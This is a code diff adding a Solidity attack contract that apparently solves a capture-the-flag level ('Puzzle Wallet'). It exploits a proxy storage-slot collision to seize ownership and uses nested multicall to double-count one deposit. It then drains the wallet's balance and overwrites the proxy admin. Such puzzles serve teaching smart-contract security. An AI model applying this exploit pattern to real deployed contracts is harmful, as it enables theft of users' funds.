@@ -68,8 +68,8 @@ contract PuzzleWallet {
     function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
         require(balances[msg.sender] >= value, "Insufficient balance");
         balances[msg.sender] = balances[msg.sender].sub(value);
-        (bool success, ) = to.call{ value: value }(data);
-        require(success, "Execution failed");
+        (bool success, bytes memory reason) = to.call{ value: value }(data);
+        require(success, string(abi.encodePacked("Execution failed", reason)));
     }
 
     function multicall(bytes[] calldata data) external payable onlyWhitelisted {
@@ -112,25 +112,38 @@ contract Solution24 {
     address owner;
     uint256 maxBalance;
 
-    function hack(address payable _proxy) public {
-        // PuzzleProxy.pendingAdmin and PuzzleWallet.owner is using the same slot
+    function hack(address payable _proxy) public payable {
+        require(msg.value >= 0.001 ether, "At least pay for 0.001 ether");
+        // PuzzleProxy.pendingAdmin and PuzzleWallet.owner is using the same slot.
+        // So that we can get ownership of PuzzleWallet by calling PuzzleProxy.proposeNewAdmin
         PuzzleProxy(_proxy).proposeNewAdmin(address(this));
         require(PuzzleWallet(_proxy).owner() == address(this), "Claiming ownership fails");
 
+        // Add attacker contract to wahitelist for furthur attack.
         PuzzleWallet(_proxy).addToWhitelist(address(this));
-        // It will fail, because 'Contract balance is not 0'.
-        // PuzzleWallet(_proxy).setMaxBalance(uint256(uint160(msg.sender)));
 
-        // Utilizing multicall will fail, because it delegate calls on itself.
-        // bytes memory data = abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(msg.sender)));
-        // bytes[] memory datas = new bytes[](1);
-        // datas[0] = data;
-        // PuzzleWallet(_proxy).multicall(datas);
+        // By using multicall, we can double the balance of attacker contract.
+        bytes memory depositData = abi.encodeWithSignature("deposit()");
 
+        bytes[] memory multicallInputs = new bytes[](1);
+        multicallInputs[0] = depositData;
+        bytes memory multicallData = abi.encodeWithSignature("multicall(bytes[])", multicallInputs);
+
+        bytes[] memory multicallInputs2 = new bytes[](2);
+        multicallInputs2[0] = multicallData;
+        multicallInputs2[1] = depositData;
+
+        PuzzleWallet(_proxy).multicall{value: msg.value}(multicallInputs2);
+        require(2*msg.value == PuzzleWallet(_proxy).balances(address(this)), string(abi.encodePacked("Balance must be doubled", PuzzleWallet(_proxy).balances(address(this)))));
+
+        // Note that It occurs an error "Execution failed" when you are using Remix VM.
+        // It works good for Rinkeby.
+
+        // Now, drain all of balance of target contract.
+        PuzzleWallet(_proxy).execute(msg.sender, 2*msg.value, "");
+
+        // Get admin for msg.sender.
+        PuzzleWallet(_proxy).setMaxBalance(uint256(uint160(msg.sender)));
         require(PuzzleProxy(_proxy).admin() == address(msg.sender), "Hack fails");
     }
-
-    // function setMaxBalance(uint256 amount) public {
-    //     maxBalance = amount;
-    // }
 }
